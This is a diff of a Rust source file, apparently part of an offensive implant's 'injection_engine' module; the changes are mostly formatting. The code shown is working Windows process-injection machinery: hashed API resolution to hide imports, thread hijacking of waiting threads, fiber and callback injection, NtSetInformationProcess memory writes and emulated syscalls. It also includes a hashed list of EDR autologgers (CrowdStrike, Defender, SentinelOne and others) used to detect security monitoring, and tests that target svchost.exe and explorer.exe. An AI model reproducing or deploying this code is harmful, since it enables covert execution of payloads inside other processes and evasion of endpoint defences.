+        CallbackApi::EnumDesktopWindows => resolve_dll_function(
+            pe_resolve::hash_str(b"user32.dll\0"),
+            b"EnumDesktopWindows\0",
+        ),
+        CallbackApi::CreateTimerQueueTimer => resolve_dll_function(
+            pe_resolve::hash_str(b"kernel32.dll\0"),
+            b"CreateTimerQueueTimer\0",
+        ),
+        CallbackApi::EnumTimeFormatsA => resolve_dll_function(
+            pe_resolve::hash_str(b"kernel32.dll\0"),
+            b"EnumTimeFormatsA\0",
+        ),
+        CallbackApi::EnumResourceTypesW => resolve_dll_function(
+            pe_resolve::hash_str(b"kernel32.dll\0"),
+            b"EnumResourceTypesW\0",
+        ),
+        CallbackApi::EnumFontFamilies => resolve_dll_function(
+            pe_resolve::hash_str(b"gdi32.dll\0"),
+            b"EnumFontFamiliesExW\0",
+        ),
         CallbackApi::CertEnumSystemStore => {
             resolve_external_dll_function(b"crypt32.dll\0", b"CertEnumSystemStore\0")
         }
         CallbackApi::SHEnumerateUnreadMailAccounts => {
-            resolve_external_dll_function(
-                b"shell32.dll\0",
-                b"SHEnumerateUnreadMailAccountsW\0",
-            )
+            resolve_external_dll_function(b"shell32.dll\0", b"SHEnumerateUnreadMailAccountsW\0")
         }
         CallbackApi::EnumerateLoadedModules => {
             resolve_external_dll_function(b"dbghelp.dll\0", b"EnumerateLoadedModulesW64\0")
@@ -6934,10 +6848,7 @@ unsafe fn build_section_callback_caller(
 
 /// Write a section callback caller stub to the target process.
 /// Allocates RW, writes, protects RX, flushes I-cache.
-unsafe fn write_section_stub(
-    h_proc: *mut c_void,
-    stub: &[u8],
-) -> Result<usize, InjectionError> {
+unsafe fn write_section_stub(h_proc: *mut c_void, stub: &[u8]) -> Result<usize, InjectionError> {
     use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
 
     let mut remote_stub: *mut c_void = std::ptr::null_mut();
@@ -7079,8 +6990,6 @@ const STATUS_NOT_SUPPORTED: i32 = 0xC00000BBu32 as i32;
 /// compares. Returns true if the info class works.
 #[cfg(windows)]
 unsafe fn test_ntsetinfo_write_support() -> bool {
-    
-
     // Get current process handle (-1 = NtCurrentProcess)
     let cur_proc: u64 = -1i64 as u64;
 
@@ -7152,8 +7061,6 @@ unsafe fn ntsetinfo_cross_write(
     target_addr: usize,
     payload: &[u8],
 ) -> Result<(), i32> {
-    
-
     // --- Attempt 1: ProcessReadWriteVm (0x6A) ---
     let mut layout_rw = ProcessReadWriteVmLayout {
         target_address: target_addr,
@@ -7242,8 +7149,6 @@ unsafe fn inject_nt_set_info_process(
     pid: u32,
     payload: &[u8],
 ) -> Result<InjectionHandle, InjectionError> {
-    
-
     // ── Step 1: Open target process ─────────────────────────────────────
     //
     // Access rights required:
@@ -7377,7 +7282,7 @@ unsafe fn inject_nt_set_info_process(
         "NtCreateThreadEx",
         &mut h_thread as *mut _ as u64,
         THREAD_INJECT_ACCESS, // minimal thread access
-        0u64,        // ObjectAttributes (NULL)
+        0u64,                 // ObjectAttributes (NULL)
         h_proc,
         base_addr as u64, // StartAddress = payload base
         0u64,             // Parameter (none)
@@ -7403,10 +7308,7 @@ unsafe fn inject_nt_set_info_process(
 
         return Err(InjectionError::InjectionFailed {
             technique: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
-            reason: format!(
-                "NtCreateThreadEx failed (status 0x{:08X})",
-                status as u32
-            ),
+            reason: format!("NtCreateThreadEx failed (status 0x{:08X})", status as u32),
         });
     }
 
@@ -7436,10 +7338,7 @@ unsafe fn inject_nt_set_info_process(
 //    SwitchToFiber(fiber) → DeleteFiber → return
 // 4. Execute the stub via NtCreateThreadEx
 
-fn inject_fiber(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_fiber(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     unsafe {
         let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;
 
@@ -7451,23 +7350,19 @@ fn inject_fiber(
                     reason: "cannot resolve kernel32 base".to_string(),
                 })?;
 
-        let create_fiber_addr = pe_resolve::get_proc_address_by_hash(
-            k32_base,
-            pe_resolve::hash_str(b"CreateFiber\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: InjectionTechnique::FiberInject,
-            reason: "cannot resolve CreateFiber".to_string(),
-        })?;
+        let create_fiber_addr =
+            pe_resolve::get_proc_address_by_hash(k32_base, pe_resolve::hash_str(b"CreateFiber\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: InjectionTechnique::FiberInject,
+                    reason: "cannot resolve CreateFiber".to_string(),
+                })?;
 
-        let delete_fiber_addr = pe_resolve::get_proc_address_by_hash(
-            k32_base,
-            pe_resolve::hash_str(b"DeleteFiber\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: InjectionTechnique::FiberInject,
-            reason: "cannot resolve DeleteFiber".to_string(),
-        })?;
+        let delete_fiber_addr =
+            pe_resolve::get_proc_address_by_hash(k32_base, pe_resolve::hash_str(b"DeleteFiber\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: InjectionTechnique::FiberInject,
+                    reason: "cannot resolve DeleteFiber".to_string(),
+                })?;
 
         let switch_to_fiber_addr = pe_resolve::get_proc_address_by_hash(
             k32_base,
@@ -7662,9 +7557,9 @@ const SYSTEM_THREAD_INFORMATION: u32 = 0x05;
 
 /// Wait reasons that indicate a thread is safe to hijack.
 const KTHREAD_WAIT_REASON_DELAY_EXECUTION: u8 = 14; // WrDelayExecution
-const KTHREAD_WAIT_REASON_SUSPENDED: u8 = 5;        // Suspended
-const KTHREAD_WAIT_REASON_WRQUEUE: u8 = 16;          // WrQueue — avoid
-const KTHREAD_WAIT_REASON_EXECUTIVE: u8 = 6;         // Executive — avoid
+const KTHREAD_WAIT_REASON_SUSPENDED: u8 = 5; // Suspended
+const KTHREAD_WAIT_REASON_WRQUEUE: u8 = 16; // WrQueue — avoid
+const KTHREAD_WAIT_REASON_EXECUTIVE: u8 = 6; // Executive — avoid
 
 /// SYSTEM_THREAD_INFORMATION entry (per-thread, inside SYSTEM_PROCESS_INFORMATION).
 ///
@@ -7834,9 +7729,7 @@ fn inject_context_only(
         );
 
         if open_thread_status.is_err() || open_thread_status.unwrap() < 0 || h_thread == 0 {
-            cleanup_and_err!(format!(
-                "NtOpenThread(tid={}) failed", candidate_tid
-            ));
+            cleanup_and_err!(format!("NtOpenThread(tid={}) failed", candidate_tid));
         }
         let h_thread = h_thread as *mut c_void;
 
@@ -8059,10 +7952,7 @@ fn inject_context_only(
             // alertable wait. If the thread is in a non-alertable wait,
             // this is a no-op and the thread will execute from the modified
             // RIP when the wait resolves naturally.
-            let alert_status = crate::emulated_syscall!(
-                "NtAlertThread",
-                h_thread as u64,
-            );
+            let alert_status = crate::emulated_syscall!("NtAlertThread", h_thread as u64,);
             if alert_status.is_ok() && alert_status.unwrap() >= 0 {
                 log::info!(
                     "injection_engine: ContextOnly: alerted thread {} to break wait",
@@ -8240,7 +8130,12 @@ fn find_best_thread(target_pid: u32) -> Option<u32> {
             let mut b = Vec::with_capacity(buf_len as usize);
             b.set_len(buf_len as usize);
 
-            let status = qsi(SYSTEM_PROCESS_INFORMATION, b.as_mut_ptr(), buf_len, &mut ret_len);
+            let status = qsi(
+                SYSTEM_PROCESS_INFORMATION,
+                b.as_mut_ptr(),
+                buf_len,
+                &mut ret_len,
+            );
 
             if status >= 0 {
                 break b;
@@ -8251,7 +8146,11 @@ fn find_best_thread(target_pid: u32) -> Option<u32> {
                 if buf_len > 0x400000 {
                     return None; // Safety limit
                 }
-                buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
+                buf_len = if ret_len > buf_len {
+                    ret_len
+                } else {
+                    buf_len * 2
+                };
             } else {
                 return None;
             }
@@ -8326,10 +8225,8 @@ fn find_best_thread(target_pid: u32) -> Option<u32> {
                 //   The name string data: MaximumLength bytes (aligned to 8)
                 //   Then thread array starts
 
-                let name_max_len = u16::from_le_bytes([
-                    buf[offset + 0x3A],
-                    buf[offset + 0x3B],
-                ]) as usize;
+                let name_max_len =
+                    u16::from_le_bytes([buf[offset + 0x3A], buf[offset + 0x3B]]) as usize;
 
                 // Align name data to 8 bytes
                 let name_aligned = (name_max_len + 7) & !7;
@@ -8382,9 +8279,9 @@ fn find_best_thread(target_pid: u32) -> Option<u32> {
                     let score = match wait_reason {
                         KTHREAD_WAIT_REASON_SUSPENDED => 100, // Best: definitely idle
                         KTHREAD_WAIT_REASON_DELAY_EXECUTION => 90, // Sleeping thread
-                        0..=4 => 50,   // Waiting for various objects (moderate)
-                        7..=13 => 30,  // Other wait reasons (lower priority)
-                        _ => 10,       // Unknown/other
+                        0..=4 => 50,  // Waiting for various objects (moderate)
+                        7..=13 => 30, // Other wait reasons (lower priority)
+                        _ => 10,      // Unknown/other
                     };
 
                     // Skip Executive and WrQueue — these threads are doing work.
@@ -8417,10 +8314,7 @@ fn find_best_thread(target_pid: u32) -> Option<u32> {
 ///
 /// Returns the address of the slack region, or `None` if no suitable region
 /// is found.
-unsafe fn find_executable_slack(
-    h_proc: *mut c_void,
-    required_size: usize,
-) -> Option<usize> {
+unsafe fn find_executable_slack(h_proc: *mut c_void, required_size: usize) -> Option<usize> {
     use winapi::um::winnt::{
         MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ,
     };
@@ -8730,9 +8624,7 @@ fn inject_waiting_thread_hijack(
         );
 
         if open_thread_status.is_err() || open_thread_status.unwrap() < 0 || h_thread == 0 {
-            cleanup_and_err!(format!(
-                "NtOpenThread(tid={}) failed", candidate.tid
-            ));
+            cleanup_and_err!(format!("NtOpenThread(tid={}) failed", candidate.tid));
         }
         let h_thread = h_thread as *mut c_void;
 
@@ -8798,11 +8690,8 @@ fn inject_waiting_thread_hijack(
         }
 
         // Find the return address on the stack.
-        let return_addr_info = find_return_address_on_stack(
-            &stack_buf[..bytes_read],
-            h_proc,
-            ntdll_base,
-        );
+        let return_addr_info =
+            find_return_address_on_stack(&stack_buf[..bytes_read], h_proc, ntdll_base);
 
         let (return_addr_offset, original_return_addr) = match return_addr_info {
             Some(info) => info,
@@ -8882,9 +8771,7 @@ fn inject_waiting_thread_hijack(
                         (thread_rsp - STACK_WRITE_OFFSET as u64) & !0xF
                     } else {
                         let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
-                        cleanup_and_err!(
-                            "no executable slack found and stack too small for WTH"
-                        );
+                        cleanup_and_err!("no executable slack found and stack too small for WTH");
                     };
                     (stack_write_addr as usize, "stack-oversize")
                 }
@@ -9110,7 +8997,12 @@ fn find_waiting_thread(target_pid: u32, _ntdll_base: usize) -> Option<WaitingThr
         let buf: Vec<u8> = loop {
             let mut b = Vec::with_capacity(buf_len as usize);
             b.set_len(buf_len as usize);
-            let status = qsi(SYSTEM_PROCESS_INFORMATION, b.as_mut_ptr(), buf_len, &mut ret_len);
+            let status = qsi(
+                SYSTEM_PROCESS_INFORMATION,
+                b.as_mut_ptr(),
+                buf_len,
+                &mut ret_len,
+            );
             if status >= 0 {
                 break b;
             }
@@ -9118,7 +9010,11 @@ fn find_waiting_thread(target_pid: u32, _ntdll_base: usize) -> Option<WaitingThr
                 if buf_len > 0x400000 {
                     return None;
                 }
-                buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
+                buf_len = if ret_len > buf_len {
+                    ret_len
+                } else {
+                    buf_len * 2
+                };
             } else {
                 return None;
             }
@@ -9134,20 +9030,31 @@ fn find_waiting_thread(target_pid: u32, _ntdll_base: usize) -> Option<WaitingThr
             }
 
             let next_entry = u32::from_le_bytes([
-                buf[offset], buf[offset + 1], buf[offset + 2], buf[offset + 3],
+                buf[offset],
+                buf[offset + 1],
+                buf[offset + 2],
+                buf[offset + 3],
             ]);
             let num_threads = u32::from_le_bytes([
-                buf[offset + 4], buf[offset + 5], buf[offset + 6], buf[offset + 7],
+                buf[offset + 4],
+                buf[offset + 5],
+                buf[offset + 6],
+                buf[offset + 7],
             ]);
             let pid = u64::from_le_bytes([
-                buf[offset + 0x50], buf[offset + 0x51], buf[offset + 0x52], buf[offset + 0x53],
-                buf[offset + 0x54], buf[offset + 0x55], buf[offset + 0x56], buf[offset + 0x57],
+                buf[offset + 0x50],
+                buf[offset + 0x51],
+                buf[offset + 0x52],
+                buf[offset + 0x53],
+                buf[offset + 0x54],
+                buf[offset + 0x55],
+                buf[offset + 0x56],
+                buf[offset + 0x57],
             ]) as u32;
 
             if pid == target_pid {
-                let name_max_len = u16::from_le_bytes([
-                    buf[offset + 0x3A], buf[offset + 0x3B],
-                ]) as usize;
+                let name_max_len =
+                    u16::from_le_bytes([buf[offset + 0x3A], buf[offset + 0x3B]]) as usize;
                 let name_aligned = (name_max_len + 7) & !7;
                 let thread_array_start = offset + 0x48 + name_aligned;
                 const THREAD_ENTRY_SIZE: usize = 0x48;
@@ -9159,13 +9066,25 @@ fn find_waiting_thread(target_pid: u32, _ntdll_base: usize) -> Option<WaitingThr
                     }
 
                     let thread_pid = u64::from_le_bytes([
-                        buf[to + 0x28], buf[to + 0x29], buf[to + 0x2A], buf[to + 0x2B],
-                        buf[to + 0x2C], buf[to + 0x2D], buf[to + 0x2E], buf[to + 0x2F],
+                        buf[to + 0x28],
+                        buf[to + 0x29],
+                        buf[to + 0x2A],
+                        buf[to + 0x2B],
+                        buf[to + 0x2C],
+                        buf[to + 0x2D],
+                        buf[to + 0x2E],
+                        buf[to + 0x2F],
                     ]) as u32;
 
                     let thread_tid = u64::from_le_bytes([
-                        buf[to + 0x30], buf[to + 0x31], buf[to + 0x32], buf[to + 0x33],
-                        buf[to + 0x34], buf[to + 0x35], buf[to + 0x36], buf[to + 0x37],
+                        buf[to + 0x30],
+                        buf[to + 0x31],
+                        buf[to + 0x32],
+                        buf[to + 0x33],
+                        buf[to + 0x34],
+                        buf[to + 0x35],
+                        buf[to + 0x36],
+                        buf[to + 0x37],
                     ]) as u32;
 
                     let wait_reason = buf[to + 0x45];
@@ -9459,12 +9378,12 @@ fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
 #[cfg(feature = "etw-check")]
 fn edr_autologger_hashes() -> &'static [(u32, &'static str)] {
     &[
-        (0xe3c6c4e4, "CrowdStrike"),     // CrowdStrike auto-logger
-        (0x63a6c3b5, "MpEtw"),           // Microsoft Defender auto-logger
-        (0x1f1dafed, "SentinelOneEtw"),   // SentinelOne auto-logger
-        (0x48a5eab4, "CBEventLog"),       // Carbon Black auto-logger
-        (0x6130b204, "FireEyeEtw"),       // FireEye auto-logger
-        (0xe869a86c, "ElasticEtw"),       // Elastic auto-logger
+        (0xe3c6c4e4, "CrowdStrike"),    // CrowdStrike auto-logger
+        (0x63a6c3b5, "MpEtw"),          // Microsoft Defender auto-logger
+        (0x1f1dafed, "SentinelOneEtw"), // SentinelOne auto-logger
+        (0x48a5eab4, "CBEventLog"),     // Carbon Black auto-logger
+        (0x6130b204, "FireEyeEtw"),     // FireEye auto-logger
+        (0xe869a86c, "ElasticEtw"),     // Elastic auto-logger
     ]
 }
 
@@ -9513,9 +9432,10 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
     // ── Build the registry path as a wide string ────────────────────────
     //
     // \Registry\Machine\SYSTEM\CurrentControlSet\Control\WMI\Autologger
-    let path_wide: Vec<u16> = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\0"
-        .encode_utf16()
-        .collect();
+    let path_wide: Vec<u16> =
+        "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\0"
+            .encode_utf16()
+            .collect();
 
     let mut key_name = UNICODE_STRING {
         Length: ((path_wide.len() - 1) * 2) as u16, // exclude null terminator
@@ -9570,12 +9490,12 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
         let mut result_len: u32 = 0;
         let status = crate::emulated_syscall!(
             "NtEnumerateKey",
-            h_key as u64,                        // KeyHandle
-            index as u64,                        // Index
+            h_key as u64,                              // KeyHandle
+            index as u64,                              // Index
             nt_key_info::KEY_BASIC_INFORMATION as u64, // KeyInformationClass
-            key_info_buf.as_mut_ptr() as u64,    // KeyInformation
-            KEY_INFO_BUF_SIZE as u64,            // Length
-            &mut result_len as *mut _ as u64,    // ResultLength
+            key_info_buf.as_mut_ptr() as u64,          // KeyInformation
+            KEY_INFO_BUF_SIZE as u64,                  // Length
+            &mut result_len as *mut _ as u64,          // ResultLength
         );
 
         index += 1;
@@ -9594,8 +9514,7 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
         if result_len < 0x0E {
             continue;
         }
-        let name_len =
-            u16::from_le_bytes([key_info_buf[0x0C], key_info_buf[0x0D]]) as usize;
+        let name_len = u16::from_le_bytes([key_info_buf[0x0C], key_info_buf[0x0D]]) as usize;
         if name_len == 0 || name_len > KEY_INFO_BUF_SIZE - 0x0E {
             continue;
         }
@@ -9648,12 +9567,12 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
 
         let vstatus = crate::emulated_syscall!(
             "NtQueryValueKey",
-            h_key as u64,                            // KeyHandle
-            &mut value_name as *mut _ as u64,        // ValueName
+            h_key as u64,                                      // KeyHandle
+            &mut value_name as *mut _ as u64,                  // ValueName
             nt_key_info::KEY_VALUE_PARTIAL_INFORMATION as u64, // KeyValueInformationClass
-            value_buf.as_mut_ptr() as u64,           // KeyValueInformation
-            VALUE_INFO_BUF_SIZE as u64,              // Length
-            &mut value_result_len as *mut _ as u64,  // ResultLength
+            value_buf.as_mut_ptr() as u64,                     // KeyValueInformation
+            VALUE_INFO_BUF_SIZE as u64,                        // Length
+            &mut value_result_len as *mut _ as u64,            // ResultLength
         );
 
         if vstatus.is_err() || vstatus.unwrap() < 0 {
@@ -9662,8 +9581,7 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
         }
 
         // REG_DWORD = type 4; data starts at offset +0x08.
-        let reg_type =
-            u32::from_le_bytes([value_buf[4], value_buf[5], value_buf[6], value_buf[7]]);
+        let reg_type = u32::from_le_bytes([value_buf[4], value_buf[5], value_buf[6], value_buf[7]]);
         if reg_type != 4 {
             continue; // Not REG_DWORD
         }
@@ -9693,9 +9611,8 @@ unsafe fn alloc_write_exec(
     payload: &[u8],
 ) -> Result<(*mut c_void, usize), InjectionError> {
     use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
-        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-        PROCESS_VM_WRITE,
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
+        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
     };
 
     // Open target process.
@@ -9749,7 +9666,10 @@ unsafe fn alloc_write_exec(
         PAGE_READWRITE as u64,
     );
     if s.is_err() || s.unwrap() < 0 || remote_mem.is_null() {
-        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtAllocateVirtualMemory failed");
+        cleanup_and_err!(
+            InjectionTechnique::ThreadHijack,
+            "NtAllocateVirtualMemory failed"
+        );
     }
 
     // Write payload.
@@ -9763,7 +9683,10 @@ unsafe fn alloc_write_exec(
         &mut written as *mut _ as u64,
     );
     if s.is_err() || s.unwrap() < 0 || written != payload.len() {
-        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtWriteVirtualMemory failed");
+        cleanup_and_err!(
+            InjectionTechnique::ThreadHijack,
+            "NtWriteVirtualMemory failed"
+        );
     }
 
     // Flip to RX.
@@ -9779,7 +9702,10 @@ unsafe fn alloc_write_exec(
         &mut old_prot as *mut _ as u64,
     );
     if s.is_err() || s.unwrap() < 0 {
-        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtProtectVirtualMemory to RX failed");
+        cleanup_and_err!(
+            InjectionTechnique::ThreadHijack,
+            "NtProtectVirtualMemory to RX failed"
+        );
     }
 
     // Flush I-cache.
@@ -9806,10 +9732,12 @@ unsafe fn create_suspended_thread(
     const THREAD_INJECT_ACCESS: u32 = 0x1A02;
 
     // Resolve NtCreateThreadEx via pe_resolve.
-    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: InjectionTechnique::ThreadHijack,
-            reason: "cannot resolve ntdll base".to_string(),
+    let ntdll_base =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).ok_or_else(|| {
+            InjectionError::InjectionFailed {
+                technique: InjectionTechnique::ThreadHijack,
+                reason: "cannot resolve ntdll base".to_string(),
+            }
         })?;
 
     let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
@@ -9911,9 +9839,7 @@ pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
             exec_method: None,
             enhanced: false,
         }),
-        "NtSetInfoProcess" => Ok(InjectionTechnique::NtSetInfoProcess {
-            target_pid: 0,
-        }),
+        "NtSetInfoProcess" => Ok(InjectionTechnique::NtSetInfoProcess { target_pid: 0 }),
         s if s.starts_with("ThreadPool:") => {
             let variant_str = &s["ThreadPool:".len()..];
             let variant = parse_threadpool_variant(variant_str)?;
@@ -10028,27 +9954,54 @@ mod tests {
     #[test]
     fn auto_select_svchost() {
         let techniques = auto_select_techniques("svchost.exe");
-        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            techniques[0],
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
         assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
-        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
-        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
-        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
+        assert!(matches!(
+            techniques[2],
+            InjectionTechnique::SectionMapping { .. }
+        ));
+        assert!(matches!(
+            techniques[3],
+            InjectionTechnique::NtSetInfoProcess { .. }
+        ));
+        assert!(matches!(
+            techniques[4],
+            InjectionTechnique::CallbackInjection { .. }
+        ));
     }
 
     #[test]
     fn auto_select_explorer() {
         let techniques = auto_select_techniques("explorer.exe");
-        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            techniques[0],
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
         assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
-        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
-        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
-        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
+        assert!(matches!(
+            techniques[2],
+            InjectionTechnique::SectionMapping { .. }
+        ));
+        assert!(matches!(
+            techniques[3],
+            InjectionTechnique::NtSetInfoProcess { .. }
+        ));
+        assert!(matches!(
+            techniques[4],
+            InjectionTechnique::CallbackInjection { .. }
+        ));
     }
 
     #[test]
     fn auto_select_service() {
         let techniques = auto_select_techniques("msiscsi_svc.exe");
-        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            techniques[0],
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
         assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
         assert_eq!(techniques[2], InjectionTechnique::ModuleStomp);
     }
@@ -10056,7 +10009,10 @@ mod tests {
     #[test]
     fn auto_select_generic() {
         let techniques = auto_select_techniques("notepad.exe");
-        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            techniques[0],
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
         assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
     }
 
@@ -10077,7 +10033,9 @@ mod tests {
 
     #[test]
     fn technique_serde_roundtrip() {
-        let t = InjectionTechnique::ThreadPool { variant: Some(ThreadPoolVariant::Work) };
+        let t = InjectionTechnique::ThreadPool {
+            variant: Some(ThreadPoolVariant::Work),
+        };
         let json = serde_json::to_string(&t).unwrap();
         let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
         assert_eq!(t, t2);
@@ -10159,7 +10117,10 @@ mod tests {
         } else {
             InjectionTechnique::ModuleStomp
         };
-        assert!(matches!(recommended, InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            recommended,
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
     }
 
     #[test]
@@ -10184,7 +10145,10 @@ mod tests {
         } else {
             InjectionTechnique::ThreadHijack
         };
-        assert!(matches!(recommended, InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            recommended,
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
     }
 
     // ── WTH-specific tests ───────────────────────────────────────────────────
@@ -10200,8 +10164,7 @@ mod tests {
         assert!(json.contains("4242"));
         assert!(json.contains("1337"));
 
-        let back: InjectionTechnique =
-            serde_json::from_str(&json).expect("deserialize");
+        let back: InjectionTechnique = serde_json::from_str(&json).expect("deserialize");
         assert_eq!(wth, back);
     }
 
@@ -10215,8 +10178,7 @@ mod tests {
         assert!(json.contains("WaitingThreadHijack"));
         assert!(json.contains("9999"));
 
-        let back: InjectionTechnique =
-            serde_json::from_str(&json).expect("deserialize");
+        let back: InjectionTechnique = serde_json::from_str(&json).expect("deserialize");
         assert_eq!(wth, back);
     }
 
@@ -10226,7 +10188,11 @@ mod tests {
         // expected x86-64 encoding.
         let trampoline = build_wth_trampoline(0xDEADBEEFCAFEBABE);
 
-        assert_eq!(trampoline.len(), 19, "trampoline should be exactly 19 bytes");
+        assert_eq!(
+            trampoline.len(),
+            19,
+            "trampoline should be exactly 19 bytes"
+        );
 
         // sub rsp, 8
         assert_eq!(&trampoline[0..4], &[0x48, 0x83, 0xEC, 0x08]);
@@ -10235,8 +10201,14 @@ mod tests {
         assert_eq!(trampoline[4], 0x48);
         assert_eq!(trampoline[5], 0xB8);
         let addr = u64::from_le_bytes([
-            trampoline[6], trampoline[7], trampoline[8], trampoline[9],
-            trampoline[10], trampoline[11], trampoline[12], trampoline[13],
+            trampoline[6],
+            trampoline[7],
+            trampoline[8],
+            trampoline[9],
+            trampoline[10],
+            trampoline[11],
+            trampoline[12],
+            trampoline[13],
         ]);
         assert_eq!(addr, 0xDEADBEEFCAFEBABE);
 
@@ -10273,7 +10245,10 @@ mod tests {
                 name,
             );
             assert!(
-                matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }),
+                matches!(
+                    techniques[0],
+                    InjectionTechnique::WaitingThreadHijack { .. }
+                ),
                 "WaitingThreadHijack should be first for {}",
                 name,
             );
@@ -10470,7 +10445,8 @@ mod tests {
         // Trampoline should be:
         //   mov rsp, imm64 (10) + mov rbp, imm64 (10) +
         //   mov rax, imm64 (10) + push rax (1) + ret (1) = 32 bytes
-        let trampoline = build_restore_trampoline(0x1234567890ABCDEF, 0xFEDCBA0987654321, 0x1111111111111111);
+        let trampoline =
+            build_restore_trampoline(0x1234567890ABCDEF, 0xFEDCBA0987654321, 0x1111111111111111);
         assert_eq!(trampoline.len(), 32);
 
         // Verify the encoding:
@@ -10495,22 +10471,40 @@ mod tests {
 
         // mov rsp, <rsp> at offset 2..10
         let rsp_val = u64::from_le_bytes([
-            trampoline[2], trampoline[3], trampoline[4], trampoline[5],
-            trampoline[6], trampoline[7], trampoline[8], trampoline[9],
+            trampoline[2],
+            trampoline[3],
+            trampoline[4],
+            trampoline[5],
+            trampoline[6],
+            trampoline[7],
+            trampoline[8],
+            trampoline[9],
         ]);
         assert_eq!(rsp_val, rsp);
 
         // mov rbp, <rbp> at offset 12..20
         let rbp_val = u64::from_le_bytes([
-            trampoline[12], trampoline[13], trampoline[14], trampoline[15],
-            trampoline[16], trampoline[17], trampoline[18], trampoline[19],
+            trampoline[12],
+            trampoline[13],
+            trampoline[14],
+            trampoline[15],
+            trampoline[16],
+            trampoline[17],
+            trampoline[18],
+            trampoline[19],
         ]);
         assert_eq!(rbp_val, rbp);
 
         // mov rax, <rip> at offset 22..30
         let rip_val = u64::from_le_bytes([
-            trampoline[22], trampoline[23], trampoline[24], trampoline[25],
-            trampoline[26], trampoline[27], trampoline[28], trampoline[29],
+            trampoline[22],
+            trampoline[23],
+            trampoline[24],
+            trampoline[25],
+            trampoline[26],
+            trampoline[27],
+            trampoline[28],
+            trampoline[29],
         ]);
         assert_eq!(rip_val, rip);
     }
@@ -10567,10 +10561,7 @@ mod tests {
             CallbackApi::CertEnumSystemStore.to_string(),
             "Callback-CertEnumSystemStore"
         );
-        assert_eq!(
-            CallbackApi::CopyFileEx.to_string(),
-            "Callback-CopyFileEx"
-        );
+        assert_eq!(CallbackApi::CopyFileEx.to_string(), "Callback-CopyFileEx");
         assert_eq!(
             CallbackApi::SHEnumerateUnreadMailAccounts.to_string(),
             "Callback-SHEnumerateUnreadMailAccounts"
@@ -10603,24 +10594,24 @@ mod tests {
     fn callback_injection_in_auto_select() {
         // Verify CallbackInjection appears in auto-select results for various targets.
         let techniques = auto_select_techniques("svchost.exe");
-        let has_cb = techniques.iter().any(|t| matches!(
-            t,
-            InjectionTechnique::CallbackInjection { .. }
-        ));
+        let has_cb = techniques
+            .iter()
+            .any(|t| matches!(t, InjectionTechnique::CallbackInjection { .. }));
         assert!(has_cb, "CallbackInjection should be in svchost auto-select");
 
         let techniques = auto_select_techniques("explorer.exe");
-        let has_cb = techniques.iter().any(|t| matches!(
-            t,
